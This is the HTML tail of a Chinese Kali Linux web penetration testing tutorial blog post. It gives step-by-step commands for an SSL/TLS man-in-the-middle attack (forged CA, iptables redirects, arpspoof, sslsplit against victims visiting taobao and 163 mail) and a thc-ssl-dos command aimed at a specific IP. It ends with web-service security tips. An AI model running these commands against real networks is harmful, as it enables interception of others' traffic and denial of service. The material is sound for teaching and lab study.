class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SSLsplit</span><br><span class="line">    透明SSL/TLS中间人攻击工具</span><br><span class="line">    对客户端伪装成服务器，对服务器伪装成普通客户端</span><br><span class="line">    伪装服务器需要伪造证书</span><br><span class="line">    支持SSL/TLS加密的SMTP、POP3、 FTP等通信中间人攻击</span><br><span class="line">利用openssl生成证书私钥</span><br><span class="line">	openssl genrsa -out ca.key 2048</span><br><span class="line">利用私钥签名伪造根证书</span><br><span class="line">	openssl req -new -x509 -days 1096 -key ca.key -out ca.crt #-x509国际标准</span><br><span class="line">启动操作系统的路由功能</span><br><span class="line">	sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">Iptables端口转发规则</span><br><span class="line">    iptables -t nat -F #清空所有规则</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 									#MSA</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 									#SMTPS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 									#IMABS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 									#POP3S</span><br><span class="line">    iptables -t nat -L #查看所有规则</span><br><span class="line">Arp欺骗</span><br><span class="line">	arpspoof -i ethO -t 1.1.1.2 -r 1.1.1.1</span><br><span class="line">启动SSLsplit</span><br><span class="line">	mkdir -p test/logdir</span><br><span class="line">	sslsplit -D -l connect.log -j /root/test -S logdir/ -K ca.key -C ca.crt -ssl 0.0.0.0</span><br><span class="line">	8443 tcp 0.0.0.0 8080</span><br><span class="line">被害者访问taobao、baidu、 mail.163.com</span><br><span class="line">查看日志和浏览器证书及证书报错信息</span><br><span class="line">安装服务器跟证节之后再次访问</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 注意：即便进行中间人攻击，依然难以破解登录密码，因为类似淘宝的登录页面会使用单独的加密控件</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sslstrip工具可以突破163邮箱的加密</span></span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">thc-ssl-dos</span><br><span class="line">    SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</span><br><span class="line">    利用SSL secure Renegotiation特性，在单- :TCP连接中生成数千个SSL重连接请</span><br><span class="line">    求，造成服务器资源过载</span><br><span class="line">    与流量式拒绝服务攻击不同，the ssI-dos可以利用dsI线路打垮30G带宽的服务器</span><br><span class="line">    服务器平均可以处理300次/秒SSL握手请求</span><br><span class="line">    对SMTPS、POP3S等 服务同样有效</span><br><span class="line">    thc-ssl-dos 199.223.209.205 2083 --accept</span><br><span class="line">对策</span><br><span class="line">    禁用SSL Renegotiation（重协商）、使用SSL Accelerator</span><br><span class="line">    通过修改thc-ssl-dos代码，可以绕过以上对策</span><br></pre></td></tr></table></figure><h3 id="补充：关于AJAX和WEB-Service"><a href="#补充：关于AJAX和WEB-Service" class="headerlink" title="补充：关于AJAX和WEB Service"></a>补充：关于AJAX和WEB Service</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">AJAX对渗透测试的挑战</span><br><span class="line">    异步请求数量多且隐蔽</span><br><span class="line">    触发AJAX请求的条件无规律</span><br><span class="line">    手动和截断代理爬网可能产生大量遗漏</span><br><span class="line">AJAX爬网工具</span><br><span class="line">	ZAP</span><br><span class="line">客户端代码审计</span><br><span class="line">    源码</span><br><span class="line">    Firebug</span><br><span class="line">WEB Service</span><br><span class="line">    面向服务的架构(service oriented architecture )便于不同系统集成共享数据</span><br><span class="line">    和功能</span><br><span class="line">    尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景</span><br><span class="line">    无页面</span><br><span class="line">两种类型的WEB Service</span><br><span class="line">	Simple object access protocol (SOAP)</span><br><span class="line">        传统的Web service开发方法，xml是唯一 -的数据交换格式</span><br><span class="line">        要求安全性的应用更多采用</span><br><span class="line">RESTful (Representational State Transfer architecture REST)</span><br><span class="line">	目前更多被采用的轻量web service, <span class="built_in">JSON</span>是 首选数据交换格式</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    使用API key或session token实现和跟踪身份认证</span><br><span class="line">    身份认证由服务器完成，而非客户端</span><br><span class="line">    APIkey、用户名、Session token永远不要通过URL发送</span><br><span class="line">    RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</span><br><span class="line">    SOAP提供强于HTTPS的WS-security机制</span><br><span class="line">    使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密</span><br><span class="line">    API KEY</span><br><span class="line">    RESTful应只允许身份认证用户使用PUT、DELETE方法</span><br><span class="line">    使用随机token防止CSRT攻击</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    对用户提交参数过滤，建议布署基于严格白名单的方法</span><br><span class="line">    报错信息消毒</span><br><span class="line">    直接对象引用应严格身份验证(点上公司以ID作为主索引)</span><br></pre></td></tr></table></figure></div><div class="post-widgets"><div id="needsharebutton-postbottom"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>tosang</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://uestc-toy.github.io/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/" title="Kali使用教程（三）：Web渗透">http://uestc-toy.github.io/2020/07/05/Kali使用教程（三）：Web渗透/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Kali/" rel="tag"><i class="fa fa-tag"></i> Kali</a> <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/" rel="prev" title="Kali使用教程（二）：无线攻击"><i class="fa fa-chevron-left"></i> Kali使用教程（二）：无线攻击</a></div><div class="post-nav-item"></div></div></footer></article></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP协议"><span class="nav-number">1.</span> <span class="nav-text">HTTP协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP协议状态码"><span class="nav-number">1.1.</span> <span class="nav-text">HTTP协议状态码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#侦察"><span class="nav-number">2.</span> <span class="nav-text">侦察</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Httrack"><span class="nav-number">2.1.</span> <span class="nav-text">Httrack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描工具"><span class="nav-number">3.</span> <span class="nav-text">扫描工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NIKTO"><span class="nav-number">3.1.</span> <span class="nav-text">NIKTO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vega"><span class="nav-number">3.2.</span> <span class="nav-text">vega</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#skipfish"><span class="nav-number">3.3.</span> <span class="nav-text">skipfish</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#w3af"><span class="nav-number">3.4.</span> <span class="nav-text">w3af</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Arachni"><span class="nav-number">3.5.</span> <span class="nav-text">Arachni</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OWASP-ZAP"><span class="nav-number">3.6.</span> <span class="nav-text">OWASP_ZAP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Burpsuite"><span class="nav-number">3.7.</span> <span class="nav-text">Burpsuite</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手动漏洞挖掘"><span class="nav-number">4.</span> <span class="nav-text">手动漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#会话sessionID"><span class="nav-number">4.2.</span> <span class="nav-text">会话sessionID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">4.3.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入"><span class="nav-number">4.4.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL盲注"><span class="nav-number">4.5.</span> <span class="nav-text">SQL盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMAP自动注入"><span class="nav-number">4.6.</span> <span class="nav-text">SQLMAP自动注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-number">4.7.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型XSS和Xsser工具"><span class="nav-number">4.8.</span> <span class="nav-text">反射型XSS和Xsser工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存储型XSS"><span class="nav-number">4.9.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BEEF"><span class="nav-number">4.10.</span> <span class="nav-text">BEEF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF"><span class="nav-number">4.11.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEBSHELL"><span class="nav-number">4.12.</span> <span class="nav-text">WEBSHELL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS攻击"><span class="nav-number">5.</span> <span class="nav-text">HTTPS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#OpenSSL"><span class="nav-number">5.1.</span> <span class="nav-text">OpenSSL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSLyze"><span class="nav-number">5.2.</span> <span class="nav-text">SSLyze</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSL-TLS中间人攻击"><span class="nav-number">5.3.</span> <span class="nav-text">SSL&#x2F;TLS中间人攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSL-TLS拒绝服务攻击"><span class="nav-number">5.4.</span> <span class="nav-text">SSL&#x2F;TLS拒绝服务攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充：关于AJAX和WEB-Service"><span class="nav-number">6.</span> <span class="nav-text">补充：关于AJAX和WEB Service</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="tosang" src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><p class="site-author-name" itemprop="name">tosang</p><div class="site-description" itemprop="description">blog、记录和分享</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">9</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="sidebar-button motion-element"><a onclick='Chatra("openChat",!0)'><i class="fa fa-comment"></i> Chat</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Vlc3RjLXRveQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;uestc-toy"><i class="fab fa-github fa-fw"></i>GitHub</span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOnRveW9rdXNhbmdAaG90bWFpbC5jb20=" title="E-Mail → mailto:toyokusang@hotmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span></span></div><div class="cc-license motion-element" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2020</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">tosang</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span title="站点总字数">74k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">1:07</span></div><div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Gemini</span> 强力驱动</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/pjax/pjax.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script>var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});</script><script data-pjax>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script>!function(a,t,n){t.ChatraID="WeqmpGNhkLxAnnuqz";var c=a.createElement("script");t[n]=t[n]||function(){(t[n].q=t[n].q||[]).push(arguments)},c.async=!1,c.src="https://call.chatra.io/chatra.js",a.head&&a.head.appendChild(c)}(document,window,"Chatra")</script><div id="pjax"><div id="needsharebutton-float"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div><script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script><script>pbOptions={iconStyle:"box",boxForm:"horizontal",position:"bottomCenter",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-postbottom",pbOptions),flOptions={iconStyle:"box",boxForm:"horizontal",position:"middleRight",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-float",flOptions)</script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = '昵称,邮箱,链接';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'cEWy5xlMxSYtWw1jc0vQSgr9-gzGzoHsz',
      appKey     : 'zR4PkPOIJ7DAgbKG7IoJDRS8',
      placeholder: "请发表你的评论",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body></html>